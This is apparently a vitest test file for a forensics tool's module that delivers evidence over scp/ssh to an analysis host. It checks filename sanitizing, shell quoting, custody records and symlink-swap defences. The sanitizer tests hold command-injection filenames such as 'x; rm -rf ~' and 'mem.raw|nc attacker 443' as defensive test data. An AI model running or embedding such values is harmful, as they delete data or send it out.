import { describe, it, expect, beforeEach } from "vitest";
import { mkdir, mkdtemp, readFile, readdir, writeFile, rm, symlink } from "node:fs/promises";
import { createHash } from "node:crypto";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  deliver,
  rewriteToRemote,
  safeRemoteName,
  shellQuote,
  spawnTransferRunner,
  type TransferRunner,
  type TransferResult,
  type DeliverySource,
} from "../../src/integrations/mcp/mcpDelivery.js";
import { SPLIT_UTF8_TEXT, splitUtf8Script } from "../helpers/splitUtf8.js";
import {
  DEFAULT_DELIVERY,
  type McpServer,
  type McpDelivery,
} from "../../src/integrations/mcp/mcpServerStore.js";

interface Call {
  binary: string;
  args: string[];
  timeoutMs: number;
  signal?: AbortSignal;
}

let calls: Call[];
let nextResult: TransferResult;

const runner: TransferRunner = async (binary, args, opts) => {
  calls.push({ binary, args, timeoutMs: opts.timeoutMs, signal: opts.signal });
  return nextResult;
};

const server = (delivery: Partial<McpDelivery> = {}): McpServer => ({
  id: "sift-mcp",
  label: "SIFT",
  enabled: true,
  allowedTools: [],
  allowedCommands: [],
  agentEnabled: false,
  timeoutMs: 300_000,
  delivery: { ...DEFAULT_DELIVERY, ...delivery },
});

const SCP = { mode: "scp" as const, host: "sift.example.com", user: "analyst", remoteDir: "/cases/incoming" };

// A real case folder: delivery opens the file through the case-file guard and sends a snapshot.
let root: string;
let MEM: string;
let source: DeliverySource;
const MEM_BYTES = "memory-image-bytes";

beforeEach(async () => {
  calls = [];
  nextResult = { stdout: "", stderr: "", code: 0 };
  root = await mkdtemp(join(tmpdir(), "dfir-mcp-deliver-"));
  await mkdir(join(root, "c1", "imports"), { recursive: true });
  MEM = join(root, "c1", "imports", "mem.raw");
  await writeFile(MEM, MEM_BYTES);
  source = { casesRoot: root, caseDir: join(root, "c1"), stagingDir: join(root, ".export-staging") };
});

const REMOTE = /^\/cases\/incoming\/[0-9a-f]{12}_mem\.raw$/;

describe("safeRemoteName", () => {
  it("keeps an ordinary evidence filename recognizable", () => {
    expect(safeRemoteName("/cases/c1/imports/memory.raw")).toBe("memory.raw");
  });

  // ssh runs its remote argument through a shell, and filenames come from evidence.
  it("strips shell metacharacters out of a hostile filename", () => {
    expect(safeRemoteName("/cases/c1/x; rm -rf ~").replace(/_+$/, "")).toBe("x_rm_-rf");
    expect(safeRemoteName("/cases/c1/$(curl evil).raw")).toBe("_curl_evil_.raw");
    expect(safeRemoteName("/cases/c1/`whoami`")).toBe("_whoami_");
    expect(safeRemoteName("mem.raw|nc attacker 443")).toBe("mem.raw_nc_attacker_443");
  });

  // basename() discards everything up to the last separator, so a payload with a slash in it is
  // mostly gone before sanitizing even runs. The remainder still has to be safe.
  it("keeps only the last path segment", () => {
    expect(safeRemoteName("/cases/c1/x; rm -rf ~/.ssh")).toBe(".ssh");
  });

  it("never yields a name that is only dots", () => {
    expect(safeRemoteName("/cases/c1/..")).toBe("evidence.dat");
    expect(safeRemoteName("/cases/c1/.")).toBe("evidence.dat");
  });

  it("bounds the length", () => {
    expect(safeRemoteName(`/cases/${"a".repeat(300)}`)).toHaveLength(120);
  });
});

describe("shellQuote", () => {
  it("wraps a value so a shell sees one word", () => {
    expect(shellQuote("/cases/a b")).toBe("'/cases/a b'");
  });

  it("escapes an embedded single quote", () => {
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
  });
});

describe("rewriteToRemote", () => {
  it("passes the path through when the mount is at the same place on both sides", () => {
    expect(rewriteToRemote(server(), "/evidence/mem.raw")).toBe("/evidence/mem.raw");
  });

  it("swaps the local prefix for the remote one", () => {
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });
    expect(rewriteToRemote(s, "/srv/cases/c1/imports/mem.raw")).toBe("/mnt/dfir/c1/imports/mem.raw");
  });

  it("refuses a path the analysis host cannot reach", () => {
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });
    expect(() => rewriteToRemote(s, "/home/analyst/mem.raw")).toThrow(/not under this server's local prefix/);
  });

  it("produces a POSIX path from a Windows-style local path", () => {
    const s = server({ localPrefix: "C:\\cases", remotePrefix: "/mnt/dfir" });
    expect(rewriteToRemote(s, "C:\\cases\\c1\\mem.raw")).toBe("/mnt/dfir/c1/mem.raw");
  });
});

describe("deliver — remote-path mode", () => {
  it("hands back the rewritten path and copies nothing", async () => {
    const s = server({ localPrefix: root, remotePrefix: "/mnt/dfir" });

    const target = await deliver(s, MEM, { runner, source });

    expect(target.remotePath).toBe("/mnt/dfir/c1/imports/mem.raw");
    expect(calls).toHaveLength(0);
    expect(target.cleanup).toBeUndefined(); // nothing was staged, so nothing to remove
  });

  // Nothing moves, but the evidence is handed to another system to read.
  it("still records a custody transfer", async () => {
    const seen: string[] = [];
    const s = server({ localPrefix: root, remotePrefix: "/mnt/dfir" });

    await deliver(s, MEM, {
      runner,
      source,
      recordTransfer: async (d) => {
        seen.push(d);
      },
    });

    expect(seen).toEqual(["SIFT (shared path /mnt/dfir/c1/imports/mem.raw)"]);
  });

  // #1847: nothing is read here, but a link is refused before the path is handed over.
  it.skipIf(process.platform === "win32")("refuses a target swapped for a link to another case", async () => {
    await mkdir(join(root, "c2"), { recursive: true });
    await writeFile(join(root, "c2", "case.json"), "other-case-secret");
    await rm(MEM);
    await symlink(join(root, "c2", "case.json"), MEM);
    const seen: string[] = [];
    const s = server({ localPrefix: root, remotePrefix: "/mnt/dfir" });
    await expect(
      deliver(s, MEM, { runner, source, recordTransfer: async (d) => void seen.push(d) }),
    ).rejects.toThrow(/symlink detected/);
    expect(seen).toEqual([]);
  });
});

describe("deliver — scp mode", () => {
  it("pushes the file and returns the staged remote path", async () => {
    const target = await deliver(server(SCP), MEM, { runner, source });

    expect(calls).toHaveLength(1);
    expect(calls[0].binary).toBe("scp");
    const [o, batch, dashes, sent, dest] = calls[0].args;
    expect([o, batch, dashes]).toEqual(["-o", "BatchMode=yes", "--"]);
    // A snapshot in its own staging folder, never the case path itself (#1847).
    expect(sent.startsWith(join(root, ".export-staging"))).toBe(true);
    expect(sent).not.toBe(MEM);
    expect(target.remotePath).toMatch(REMOTE);
    expect(dest).toBe(`analyst@sift.example.com:${target.remotePath}`);
    expect(target.destination).toBe(`analyst@sift.example.com:${target.remotePath}`);
  });

  // BatchMode on and StrictHostKeyChecking untouched: an unknown host fails closed rather than
  // trusting whatever answered the address.
  it("never prompts and never disables host-key checking", async () => {
    await deliver(server(SCP), MEM, { runner, source });
    const args = calls[0].args.join(" ");
    expect(args).toContain("BatchMode=yes");
    expect(args).not.toContain("StrictHostKeyChecking");
  });

  it("passes an identity file and a non-default port", async () => {
    await deliver(server({ ...SCP, identityFile: "/home/dfir/.ssh/lab", port: 2222 }), MEM, {
      source,
      runner,
    });
    expect(calls[0].args.slice(0, 7)).toEqual([
      "-o",
      "BatchMode=yes",
      "-i",
      "/home/dfir/.ssh/lab",
      "-P",
      "2222",
      "--",
    ]);
  });

  it("omits the port flag when it is the default", async () => {
    await deliver(server(SCP), MEM, { runner, source });
    expect(calls[0].args).not.toContain("-P");
  });

  it("uses a bare host when no user is configured", async () => {
    await deliver(server({ ...SCP, user: "" }), MEM, { runner, source });
    expect(calls[0].args.at(-1)).toMatch(/^sift\.example\.com:\/cases\/incoming\/[0-9a-f]{12}_mem\.raw$/);
  });

  it("sanitizes the remote filename rather than trusting the evidence name", async () => {
    const hostile = join(root, "c1", "imports", "x; rm -rf ~");
    await writeFile(hostile, "x");
    const target = await deliver(server(SCP), hostile, { runner, source });
    expect(target.remotePath).toMatch(/^\/cases\/incoming\/[0-9a-f]{12}_x_rm_-rf_$/);
  });

  it("uses the delivery timeout, not the call timeout", async () => {
    await deliver(server(SCP), MEM, { runner, source });
    expect(calls[0].timeoutMs).toBe(3_600_000);
  });

  it("threads the cancel signal into the transfer", async () => {
    const controller = new AbortController();
    await deliver(server(SCP), MEM, { runner, source, signal: controller.signal });
    expect(calls[0].signal).toBe(controller.signal);
  });

  it("reports byte progress by polling the staged file size over SSH", async () => {
    const localPath = MEM;
    await writeFile(localPath, Buffer.alloc(1024));
    const progress: Array<[number, number]> = [];
    const pollingRunner: TransferRunner = async (binary, args, opts) => {
      calls.push({ binary, args, timeoutMs: opts.timeoutMs, signal: opts.signal });
      if (binary === "scp") {
        await new Promise((resolve) => setTimeout(resolve, 30));
        return { stdout: "", stderr: "", code: 0 };
      }
      return { stdout: "512\n", stderr: "", code: 0 };
    };
    try {
      await deliver(server(SCP), localPath, {
        runner: pollingRunner,
        source,
        progressIntervalMs: 5,
        onProgress: (done, total) => {
          progress.push([done, total]);
        },
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }

    expect(calls.some((c) => c.binary === "ssh" && c.args.includes("stat"))).toBe(true);
    expect(progress[0]).toEqual([0, 1024]);
    expect(progress).toContainEqual([512, 1024]);
    expect(progress.at(-1)).toEqual([1024, 1024]);
  });

  it("fails with what scp said when the copy fails", async () => {
    nextResult = { stdout: "", stderr: "Host key verification failed.\n", code: 1 };

    await expect(deliver(server(SCP), MEM, { runner, source })).rejects.toThrow(
      /scp to analyst@sift\.example\.com:.*failed \(exit 1\): Host key verification failed\./,
    );
  });

  it("records a custody transfer naming where the bytes went", async () => {
    const seen: string[] = [];
    await deliver(server(SCP), MEM, {
      source,
      runner,
      recordTransfer: async (d) => {
        seen.push(d);
      },
    });
    expect(seen).toHaveLength(1);
    expect(seen[0]).toMatch(/^analyst@sift\.example\.com:\/cases\/incoming\/[0-9a-f]{12}_mem\.raw$/);
  });

  // A failed transfer moved nothing, so the chain must not claim it did.
  it("records no custody transfer when the copy failed", async () => {
    nextResult = { stdout: "", stderr: "no route to host", code: 255 };
    const seen: string[] = [];

    await expect(
      deliver(server(SCP), MEM, {
        source,
        runner,
        recordTransfer: async (d) => {
          seen.push(d);
        },
      }),
    ).rejects.toThrow();

    expect(seen).toEqual([]);
  });
});

// #1847: scp opened the case path by name, so a swap sent another file; and a failed custody record
// left the remote copy behind. Now scp sends a snapshot of the judged handle, and every failure after
// scp started removes the remote copy.
describe("deliver — scp sends a snapshot of the checked file (#1847)", () => {
  const staged = async (): Promise<string[]> => readdir(source.stagingDir).catch(() => []);
  const rmCalls = () => calls.filter((c) => c.binary === "ssh" && c.args.includes("rm"));

  it("scp reads the snapshot's bytes, and a swap of the case path after the check changes nothing", async () => {
    await mkdir(join(root, "c2"), { recursive: true });
    await writeFile(join(root, "c2", "case.json"), "other-case-secret");
    let sentBytes = "";
    const swapping: TransferRunner = async (binary, args, opts) => {
      calls.push({ binary, args, timeoutMs: opts.timeoutMs });
      if (binary === "scp") {
        // The attacker swaps the case path while scp runs; scp holds only the snapshot path.
        await rm(MEM);
        if (process.platform !== "win32") await symlink(join(root, "c2", "case.json"), MEM);
        sentBytes = await readFile(args.at(-2)!, "utf8");
      }
      return { stdout: "", stderr: "", code: 0 };
    };
    const sent: string[] = [];
    await deliver(server(SCP), MEM, {
      runner: swapping,
      source,
      recordTransfer: async (_d, info) => void sent.push(info!.sha256),
    });
    expect(sentBytes).toBe(MEM_BYTES);
    expect(sent).toEqual([createHash("sha256").update(MEM_BYTES).digest("hex")]);
    expect(await staged()).toEqual([]);
  });

  it.skipIf(process.platform === "win32")(
    "refuses a case path already swapped for a link; scp never runs",
    async () => {
      await mkdir(join(root, "c2"), { recursive: true });
      await writeFile(join(root, "c2", "case.json"), "other-case-secret");
      await rm(MEM);
      await symlink(join(root, "c2", "case.json"), MEM);
      await expect(deliver(server(SCP), MEM, { runner, source })).rejects.toThrow(/symlink detected/);
      expect(calls).toEqual([]);
      expect(await staged()).toEqual([]);
    },
  );

  it("removes the remote copy when the custody record fails, and the error still reaches the caller", async () => {
    await expect(
      deliver(server(SCP), MEM, {
        runner,
        source,
        recordTransfer: async () => {
          throw new Error("custody log unwritable");
        },
      }),
    ).rejects.toThrow("custody log unwritable");
    expect(rmCalls()).toHaveLength(1);
    const scpDest = calls.find((c) => c.binary === "scp")!.args.at(-1)!;
    expect(rmCalls()[0].args.at(-1)).toBe(`'${scpDest.split(":")[1]}'`);
    expect(await staged()).toEqual([]);
  });

  it("removes a partial remote copy when scp fails", async () => {
    nextResult = { stdout: "", stderr: "connection reset", code: 1 };
    await expect(deliver(server(SCP), MEM, { runner, source })).rejects.toThrow(/scp to .* failed/);
    expect(rmCalls()).toHaveLength(1);
    expect(await staged()).toEqual([]);
  });

  it("says so when the remote copy cannot be removed after a failure", async () => {
    const failing: TransferRunner = async (binary, args, opts) => {
      calls.push({ binary, args, timeoutMs: opts.timeoutMs });
      return binary === "scp" ? { stdout: "", stderr: "", code: 0 } : { stdout: "", stderr: "", code: 255 };
    };
    await expect(
      deliver(server(SCP), MEM, {
        runner: failing,
        source,
        recordTransfer: async () => {
          throw new Error("custody log unwritable");
        },
      }),
    ).rejects.toThrow(/custody log unwritable — and the copy at .* could not be removed/);
  });

  it("two deliveries of the same file never share a remote name", async () => {
    const a = await deliver(server(SCP), MEM, { runner, source });
    const b = await deliver(server(SCP), MEM, { runner, source });
    expect(a.remotePath).not.toBe(b.remotePath);
  });
});

describe("deliver — scp cleanup", () => {
  it("removes the staged copy over ssh, with the path quoted", async () => {
    const target = await deliver(server(SCP), MEM, { runner, source });
    calls.length = 0;

    await target.cleanup?.();

    expect(calls).toHaveLength(1);
    expect(calls[0].binary).toBe("ssh");
    expect(calls[0].args).toEqual([
      "-o",
      "BatchMode=yes",
      "analyst@sift.example.com",
      "rm",
      "-f",
      "--",
      `'${target.remotePath}'`,
    ]);
  });

  it("passes the non-default port with ssh's lowercase flag", async () => {
    const target = await deliver(server({ ...SCP, port: 2222 }), MEM, { runner, source });
    calls.length = 0;
    await target.cleanup?.();
    expect(calls[0].args).toContain("-p");
    expect(calls[0].args).toContain("2222");
  });

  // Failing an analysis whose result already arrived, over a leftover temp file, helps nobody.
  it("swallows a failed cleanup", async () => {
    // Copies fine, but the box is gone by the time we try to tidy up.
    const flaky: TransferRunner = async (binary) => {
      if (binary === "ssh") throw new Error("connection lost");
      return { stdout: "", stderr: "", code: 0 };
    };
    const target = await deliver(server(SCP), MEM, { runner: flaky, source });

    await expect(target.cleanup?.()).resolves.toBeUndefined();
  });
});

// A real spawn against `node -e`, so this exercises the actual pipe/collect path rather than the
// injected runner every test above uses. scp is quiet on success and terse on failure, so stderr is
// the whole diagnostic an operator gets — and a remote path with a non-ASCII name is exactly what
// appears in it.
// #1847: the caller removes the remote copy right after a stopped transfer settles, so the transfer
// must have exited by then — an scp still running could write the copy again after the removal.
describe("spawnTransferRunner stop", () => {
  it.skipIf(process.platform === "win32")(
    "settles a cancelled transfer only after the child exits",
    async () => {
      const marker = join(root, "exited");
      const script = `process.on("SIGTERM", () => setTimeout(() => { require("fs").writeFileSync(${JSON.stringify(marker)}, "x"); process.exit(0); }, 300)); setInterval(() => {}, 1000);`;
      const controller = new AbortController();
      const run = spawnTransferRunner()(process.execPath, ["-e", script], {
        timeoutMs: 30_000,
        signal: controller.signal,
      });
      setTimeout(() => controller.abort(), 200);
      await expect(run).rejects.toThrow(/cancelled/);
      expect(await readFile(marker, "utf8")).toBe("x");
    },
    10_000,
  );
});

describe("spawnTransferRunner output decoding", () => {
  it("reassembles a character split across two stderr chunks", async () => {
    const r = await spawnTransferRunner()(process.execPath, ["-e", splitUtf8Script({ stream: "stderr" })], {
      timeoutMs: 10_000,
    });
    expect(r.stderr).toBe(SPLIT_UTF8_TEXT);
  });

  it("reassembles a character split across two stdout chunks", async () => {
    const r = await spawnTransferRunner()(process.execPath, ["-e", splitUtf8Script()], { timeoutMs: 10_000 });
    expect(r.stdout).toBe(SPLIT_UTF8_TEXT);
  });
});
